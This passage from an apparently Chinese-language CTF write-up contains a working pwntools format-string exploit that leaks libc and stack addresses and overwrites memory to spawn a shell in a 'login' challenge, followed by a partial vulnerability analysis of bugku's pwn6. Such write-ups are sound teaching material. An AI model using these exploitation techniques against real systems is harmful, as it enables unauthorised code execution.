
```python
from pwn import *
#from LibcSearcher import LibcSearcher
#p=remote('108.160.139.79',9090)
p=process('./login')
elf=ELF('./login')
libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#context.log_level="debug"
p.sendafter('your name: ','ad')
payload1='\n%6$p\n%15$p\n'
p.sendafter('Please input your password: \n',payload1)

def DoubSzWt(number,deviation):
    payload='%' + str(number) + 'c%' + str(deviation) + '$hn'
    return payload

p.recvuntil('0x')
stack_addr=int(p.recv(8),16)
p.recvuntil('0x')
libc_main_addr=int(p.recv(8),16)-247
print "libc_main_addr=>",hex(libc_main_addr)
'''libc=LibcSearcher('__libc_start_main',libc_main_addr)'''
libc_data=libc_main_addr-libc.symbols['__libc_start_main']
sys_addr=libc_data+libc.symbols['system']#+0x480
#str_sh_addr=libc_data+libc.symbols['str_bin_sh']
str_bin_sh=libc.search("/bin/sh\x00").next()
sys_addr_0_2=int(str(hex(sys_addr))[6:10],16)
sys_addr_2_4=int(str(hex(sys_addr))[2:6],16)
stack_addr_0_2=int(str(hex(stack_addr))[6:10],16)
print "sys_addr=>",hex(sys_addr)
print 'sys_addr_0_2=>',hex(sys_addr_0_2)
print 'sys_addr_2_4=>',hex(sys_addr_2_4)
print 'stack_addr=>',hex(stack_addr)
print 'stack_addr_0_2=>',hex(stack_addr_0_2)
print 'libc_data=>',hex(libc_data)

p.sendafter('Try again!\n',DoubSzWt(stack_addr_0_2-12,6))
p.sendafter('Try again!\n',DoubSzWt(int('B014',16),10))

p.sendafter('Try again!\n',DoubSzWt(stack_addr_0_2+4,6))
p.sendafter('Try again!\n',DoubSzWt(int('B016',16),10))
'''
gdb.attach(p,'break *0x80485AF\nc')
pause()
'''
# in case sys_addr_2_4 < sys_addr_0_2 will fail
payload='%' + str(sys_addr_0_2) + 'c%7$hn' + '%' + str(sys_addr_2_4 - sys_addr_0_2) + 'c%11$hn'
p.sendafter('Try again!\n',payload)
p.sendafter('Try again!\n','/bin/sh\x00')

p.interactive()
```

以及攻击效果：

```bash
dc@ubuntu:~/playground$ python payload_login.py
[+] Starting local process './login': pid 80372
[*] '/home/dc/playground/login'
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
[*] '/lib/i386-linux-gnu/libc.so.6'
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
libc_main_addr=> 0xf7df4550
sys_addr=> 0xf7e16db0
sys_addr_0_2=> 0x6db0
sys_addr_2_4=> 0xf7e1
stack_addr=> 0xff849c68
stack_addr_0_2=> 0x9c68
libc_data=> 0xf7ddc000
[*] Switching to interactive mode
sh: 1: This: not found
$ whoami
dc
```

## 实战

以`bugku`平台的[`pwn6`](https://bbs.kanxue.com/elink@fc0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2V1M7X3g2S2L8h3y4J5j5h3y4C8k6i4u0Q4x3X3g2G2L8X3I4A6L8X3g2Q4x3V1k6V1i4K6u0r3z5e0x3#2y4K6u0T1k6X3g2V1z5o6p5J5y4r3f1%4z5e0S2W2j5h3u0Q4x3V1k6X3K9h3I4W2M7#2)9J5c8W2)9K6c8Y4m8Q4x3@1c8Q4x3V1k6o6M7X3q4U0K9#2)9#2k6V1#2W2i4K6u0r3M7s2N6F1y4R3`.)`为例，拿到文件后查看下信息：

```bash
dc@ubuntu:~/playground$ file ./pwn6
./pwn6: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.18, BuildID[sha1]=365a5457b66ba7f0a740bd937960303dbe40a2e3, stripped
dc@ubuntu:~/playground$ pwn checksec pwn6
[*] '/home/dc/playground/pwn6'
Arch:     amd64-64-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

有`PIE`保护那么需要泄露`main`、`libc`的地址。

### vulnerabilities

1. 第一个函数中有缓冲区溢出风险：

```c
v3 = read(0, &src, 0x150uLL);
```

而控制循环的变量正好位于其下方：

```asm
.data:00000000002015C0 src db 0 ; DATA XREF: _1_C15+65↑o
...
.data:0000000000201700 qword_201700 dq 1
```

2. 第二个函数里有格式化字符串漏洞：

```c
v1 = read(0, buf1, 24uLL);
puts("after encoding...");
sub_AFF(buf1, v1);
printf(buf1);
```

尽管程序会对字符串进行移位操作：

```c
__int64 __fastcall sub_AFF(__int64 buf, int len)
{
    __int64 result;
    // rax
    int index;
    // [rsp+18h] [rbp-4h]

    for ( index = 0; ; ++index )
    {
        result = index;
        if ( index >= len )
            break;
        *(buf + index) = 4 * (*(buf + index) & 0xC) + 4 * (*(buf + index) & 0x30) + ((*(buf + index) & 0xC0) >> 6) + 4 * (*(buf + index) & 3);
    }
    return result;
}
```

并且`buf`不在栈上：

```asm
.bss:0000000000201720 buf1
```

但如果在栈中构造好两个链条，还是有机会利用这个漏洞劫持`printf@got`。

3. 第三个函数中有`strcpy`，存在栈溢出的风险：

```c
strcpy(buf, &src);
```

可以用来将一些值部署在栈中。

4. 第二个函数开辟了很多栈空间，而且并没有初始化栈空间的值：
